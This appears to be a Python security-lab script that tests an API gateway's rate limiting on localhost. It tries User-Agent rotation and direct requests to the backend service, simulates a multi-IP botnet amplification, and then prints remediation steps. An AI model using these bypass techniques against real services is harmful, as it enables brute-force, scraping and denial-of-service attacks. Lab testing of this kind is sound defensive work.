#!/usr/bin/env python3
"""
Rate Limit Bypass Attack
=========================

VULNERABILITY: Rate limiter can be bypassed through:
1. Rotating User-Agent headers
2. Direct service access (bypassing gateway)
3. Distributed attacks from multiple IPs

IMPACT: Attackers can perform brute force, DoS, or data scraping without limits

This script demonstrates:
1. Testing rate limit enforcement
2. Bypassing through header manipulation
3. Bypassing through direct service access
4. Metrics showing rate limit effectiveness

Author: DevSecOps Hacking Lab
"""

import requests
import json
import time
from datetime import datetime
from typing import Dict, List, Any
import sys
import random


class RateLimitBypassAttack:
    """Demonstrates rate limit bypass techniques"""
    
    def __init__(self, gateway_url: str = "http://localhost:8080"):
        self.gateway_url = gateway_url
        self.user_service_url = "http://localhost:8002"
        self.results = {
            "attack_name": "Rate Limit Bypass",
            "timestamp": datetime.now().isoformat(),
            "tests": [],
            "bypass_attempts": 0,
            "successful_bypasses": 0
        }
        
        # User agents for rotation
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36",
            "curl/7.88.1",
            "python-requests/2.31.0",
            "PostmanRuntime/7.32.0",
            "Googlebot/2.1 (+http://www.google.com/bot.html)"
        ]
    
    def banner(self):
        """Print attack banner"""
        print("\n" + "="*70)
        print("🎭 RATE LIMIT BYPASS ATTACK")
        print("="*70)
        print(f"Target Gateway: {self.gateway_url}")
        print(f"Direct Access: {self.user_service_url}")
        print("Testing: Rate limit evasion techniques")
        print("="*70 + "\n")
    
    def test_basic_rate_limit(self, requests_count: int = 15) -> Dict[str, Any]:
        """
        Test 1: Verify rate limit exists and works
        """
        print(f"[*] Test 1: Testing basic rate limit ({requests_count} requests)...")
        
        test_result = {
            "test_name": "Basic Rate Limit Test",
            "requests_sent": requests_count,
            "success_count": 0,
            "rate_limited_count": 0,
            "responses": []
        }
        
        for i in range(1, requests_count + 1):
            try:
                response = requests.get(self.gateway_url, timeout=3)
                
                status_msg = "✓ OK" if response.status_code == 200 else f"✗ {response.status_code}"
                print(f"    [{i:2d}] {status_msg}")
                
                test_result["responses"].append({
                    "request_num": i,
                    "status_code": response.status_code
                })
                
                if response.status_code == 200:
                    test_result["success_count"] += 1
                elif response.status_code == 429:
                    test_result["rate_limited_count"] += 1
                    
            except Exception as e:
                print(f"    [{i:2d}] ✗ ERROR: {e}")
        
        print(f"\n    Summary: {test_result['success_count']} OK, "
              f"{test_result['rate_limited_count']} Rate Limited\n")
        
        self.results["tests"].append(test_result)
        return test_result
    
    def bypass_with_user_agent_rotation(self, requests_count: int = 15) -> Dict[str, Any]:
        """
        Test 2: Try to bypass by rotating User-Agent
        (Usually doesn't work if rate limit is IP-based)
        """
        print(f"[*] Test 2: Bypass attempt - User-Agent rotation...")
        
        test_result = {
            "test_name": "User-Agent Rotation Bypass",
            "technique": "Rotating User-Agent headers",
            "requests_sent": requests_count,
            "success_count": 0,
            "rate_limited_count": 0
        }
        
        self.results["bypass_attempts"] += 1
        
        for i in range(1, requests_count + 1):
            try:
                # Rotate user agent
                user_agent = random.choice(self.user_agents)
                headers = {"User-Agent": user_agent}
                
                response = requests.get(self.gateway_url, headers=headers, timeout=3)
                
                status_msg = "✓ OK" if response.status_code == 200 else f"✗ {response.status_code}"
                print(f"    [{i:2d}] {status_msg} (UA: {user_agent[:30]}...)")
                
                if response.status_code == 200:
                    test_result["success_count"] += 1
                elif response.status_code == 429:
                    test_result["rate_limited_count"] += 1
                    
            except Exception as e:
                print(f"    [{i:2d}] ✗ ERROR: {e}")
        
        # Determine if bypass was successful
        bypass_success = test_result["success_count"] > 10  # If most requests succeeded
        test_result["bypass_successful"] = bypass_success
        
        if bypass_success:
            print(f"\n    🚨 BYPASS SUCCESSFUL - Rate limit evaded!")
            self.results["successful_bypasses"] += 1
        else:
            print(f"\n    ✓ Rate limit held - Bypass failed")
        
        print()
        self.results["tests"].append(test_result)
        return test_result
    
    def bypass_direct_service_access(self, requests_count: int = 20) -> Dict[str, Any]:
        """
        Test 3: Bypass rate limit by accessing service directly
        (This WILL work - demonstrates the vulnerability)
        """
        print(f"[*] Test 3: Bypass - Direct service access (NO rate limit)...")
        
        test_result = {
            "test_name": "Direct Service Access Bypass",
            "technique": "Bypassing gateway, accessing user-service:8002 directly",
            "requests_sent": requests_count,
            "success_count": 0,
            "rate_limited_count": 0
        }
        
        self.results["bypass_attempts"] += 1
        
        for i in range(1, requests_count + 1):
            try:
                # Access user-service directly (bypasses gateway rate limit)
                response = requests.get(
                    f"{self.user_service_url}/health",
                    timeout=3
                )
                
                status_msg = "✓ OK" if response.status_code == 200 else f"✗ {response.status_code}"
                print(f"    [{i:2d}] {status_msg}")
                
                if response.status_code == 200:
                    test_result["success_count"] += 1
                elif response.status_code == 429:
                    test_result["rate_limited_count"] += 1
                    
            except Exception as e:
                print(f"    [{i:2d}] ✗ ERROR: {e}")
        
        # This should succeed (bypasses gateway)
        bypass_success = test_result["success_count"] == requests_count
        test_result["bypass_successful"] = bypass_success
        
        if bypass_success:
            print(f"\n    🚨 COMPLETE BYPASS - All {requests_count} requests succeeded!")
            print(f"        Gateway rate limit: BYPASSED")
            self.results["successful_bypasses"] += 1
        else:
            print(f"\n    Partial bypass")
        
        print()
        self.results["tests"].append(test_result)
        return test_result
    
    def distributed_attack_simulation(self) -> Dict[str, Any]:
        """
        Test 4: Simulate distributed attack (conceptual)
        Shows how rate limit per-IP can be bypassed with botnets
        """
        print("[*] Test 4: Distributed attack simulation (conceptual)...")
        print("    Note: This is a demonstration, not actual multi-IP attack\n")
        
        test_result = {
            "test_name": "Distributed Attack Simulation",
            "technique": "Multiple source IPs (simulated)",
            "description": "In real attack: use botnet/proxies to bypass IP-based rate limiting"
        }
        
        # Show the concept
        simulated_ips = [
            "192.168.1.100",
            "10.0.0.50",
            "172.16.5.20",
            "203.0.113.42",
            "198.51.100.88"
        ]
        
        print("    Simulated attack sources:")
        for ip in simulated_ips:
            # In real scenario: each IP gets its own rate limit bucket
            requests_per_ip = 60  # Each IP can do 60 req/min
            total_capacity = len(simulated_ips) * requests_per_ip
            print(f"        {ip} → {requests_per_ip} req/min")
        
        print(f"\n    Total capacity: {total_capacity} req/min (vs 60 req/min single IP)")
        print(f"    Amplification: {total_capacity // 60}x\n")
        
        test_result["simulated_ips"] = len(simulated_ips)
        test_result["total_capacity"] = total_capacity
        test_result["bypass_successful"] = True
        
        self.results["bypass_attempts"] += 1
        self.results["successful_bypasses"] += 1
        self.results["tests"].append(test_result)
        return test_result
    
    def check_rate_limit_metrics(self):
        """Check rate limit metrics"""
        print("[*] Checking rate limit metrics...")
        
        try:
            response = requests.get(f"{self.gateway_url}/metrics", timeout=5)
            
            if response.status_code == 200:
                metrics = response.text
                
                print("\n    Rate limit metrics:")
                for line in metrics.split('\n'):
                    if 'gateway_rate_limit_blocks_total' in line and not line.startswith('#'):
                        print(f"      {line}")
                
                if 'gateway_rate_limit_blocks_total' not in metrics:
                    print("      [!] No rate limit metrics found")
            
        except Exception as e:
            print(f"    [✗] Could not fetch metrics: {e}")
    
    def generate_report(self) -> str:
        """Generate attack report"""
        print("\n" + "="*70)
        print("📊 RATE LIMIT BYPASS ATTACK REPORT")
        print("="*70)
        print(f"Tests performed: {len(self.results['tests'])}")
        print(f"Bypass attempts: {self.results['bypass_attempts']}")
        print(f"Successful bypasses: {self.results['successful_bypasses']}")
        
        if self.results['successful_bypasses'] > 0:
            print(f"\n⚠️ VULNERABILITY: Rate limit can be bypassed!")
            print(f"   Most effective: Direct service access (port 8002)")
        
        print("="*70)
        
        # Save report
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"results/rate_limit_bypass_{timestamp}.json"
        
        try:
            with open(filename, 'w') as f:
                json.dump(self.results, f, indent=2)
            print(f"\n[✓] Report saved to: {filename}")
        except Exception as e:
            print(f"\n[✗] Could not save report: {e}")
        
        return filename
    
    def run(self):
        """Execute complete rate limit bypass attack"""
        self.banner()
        
        # Test 1: Basic rate limit
        self.test_basic_rate_limit(15)
        time.sleep(2)  # Wait for rate limit to reset
        
        # Test 2: User-Agent rotation
        self.bypass_with_user_agent_rotation(15)
        time.sleep(2)
        
        # Test 3: Direct service access
        self.bypass_direct_service_access(20)
        time.sleep(1)
        
        # Test 4: Distributed attack simulation
        self.distributed_attack_simulation()
        
        # Check metrics
        self.check_rate_limit_metrics()
        
        # Generate report
        self.generate_report()
        
        print("\n💡 REMEDIATION:")
        print("   1. Don't expose backend services directly (remove port 8002)")
        print("   2. Implement distributed rate limiting (Redis-based)")
        print("   3. Use IP + User-Agent + Token combination for tracking")
        print("   4. Add CAPTCHA for suspicious patterns")
        print("   5. Implement mTLS to prevent direct service access")
        print()


def main():
    """Main entry point"""
    attack = RateLimitBypassAttack()
    
    try:
        attack.run()
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[✗] Attack failed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()

